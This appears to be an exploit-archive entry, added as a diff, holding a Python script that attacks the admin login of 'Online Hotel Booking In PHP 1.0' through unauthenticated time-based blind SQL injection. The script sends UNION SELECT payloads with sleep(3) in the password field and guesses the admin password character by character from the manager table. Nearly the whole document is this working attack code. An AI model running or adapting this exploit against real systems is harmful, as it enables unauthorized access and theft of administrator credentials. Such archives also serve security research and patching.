@@ -1,0 +1,89 @@
+id: 39509
+date: 04/02/2024
+title: Online Hotel Booking In PHP 1.0 - Blind SQL Injection (Unauthenticated) Exploit
+author: Gian Paris
+cves: 
+
+# Exploit Title:  Online Hotel Booking In PHP 1.0 - Blind SQL Injection (Unauthenticated)
+# Exploit Author: Gian Paris C. Agsam
+# Vendor Homepage: https://github.com/projectworldsofficial
+# Software Link: https://projectworlds.in/wp-content/uploads/2019/06/hotel-booking.zip
+# Version: 1.0
+# Tested on: Apache/2.4.58 (Debian) / PHP 8.2.12
+# CVE : n/a
+
+import requests
+import argparse
+from colorama import (Fore as F, Back as B, Style as S)
+
+BR,FT,FR,FG,FY,FB,FM,FC,ST,SD,SB,FW = B.RED,F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT,F.WHITE
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+parser = argparse.ArgumentParser(description='Exploit Blind SQL Injection')
+parser.add_argument('-u', '--url', help='')
+args = parser.parse_args()
+
+
+def banner():
+    print(f"""{FR}
+      ·▄▄▄·▄▄▄.▄▄ · ▄▄▄ . ▄▄· ·▄▄▄▄  ▄▄▄        ▪  ·▄▄▄▄  
+▪     ▐▄▄·▐▄▄·▐█ ▀. ▀▄.▀·▐█ ▌▪██▪ ██ ▀▄ █·▪     ██ ██▪ ██ 
+ ▄█▀▄ ██▪ ██▪ ▄▀▀▀█▄▐▀▀▪▄██ ▄▄▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▐█·▐█· ▐█▌
+▐█▌.▐▌██▌.██▌.▐█▄▪▐█▐█▄▄▌▐███▌██. ██ ▐█•█▌▐█▌.▐▌▐█▌██. ██ 
+ ▀█▄▀▪▀▀▀ ▀▀▀  ▀▀▀▀  ▀▀▀ ·▀▀▀ ▀▀▀▀▀• .▀  ▀ ▀█▄▀▪▀▀▀▀▀▀▀▀• 
+        Github: https://github.com/offensive-droid 
+        {FW}
+    """)
+
+
+# Define the characters to test
+chars = [
+    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
+    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',
+    'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
+    'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7',
+    '8', '9', '@', '#'
+]
+
+def sqliPayload(char, position, userid, column, table):
+    sqli = 'admin\' UNION SELECT IF(SUBSTRING('
+    sqli += str(column) + ','
+    sqli += str(position) + ',1) = \''
+    sqli += str(char) + '\',sleep(3),null) FROM '
+    sqli += str(table) + ' WHERE uname="admin"\''
+    return sqli
+
+def postRequest(URL, sqliReq, char, position):
+    sqliURL = URL
+    params = {"emailusername": "admin", "password": sqliReq, "submit": "Login"}
+    req = requests.post(url=sqliURL, data=params, verify=False, proxies=proxies, timeout=10)
+    if req.elapsed.total_seconds() >= 2:
+        print("{} : {}".format(char, req.elapsed.total_seconds()))
+        return char
+
+    return ''
+
+def theHarvester(target, CHARS, url):
+    #print("Retrieving: {} {} {}".format(target['table'], target['column'], target['id']))
+    print("Retrieving admin password".format(target['table'], target['column'], target['id']))
+    position = 1
+    full_pass = ""
+    while position < 5:
+        for char in CHARS:
+            sqliReq = sqliPayload(char, position, target['id'], target['column'], target['table'])
+            found_char = postRequest(url, sqliReq, char, position)
+            full_pass += found_char
+        position += 1
+    return full_pass
+
+if __name__ == "__main__":
+    banner()
+    HOST = str(args.url)
+    PATH = HOST + "/hotel booking/admin/login.php"
+    adminPassword = {"id": "1", "table": "manager", "column": "upass"}
+    adminPass = theHarvester(adminPassword, chars, PATH)
+    print("Admin Password:", adminPass)
+
+#  0day.today [2024-04-05]  #
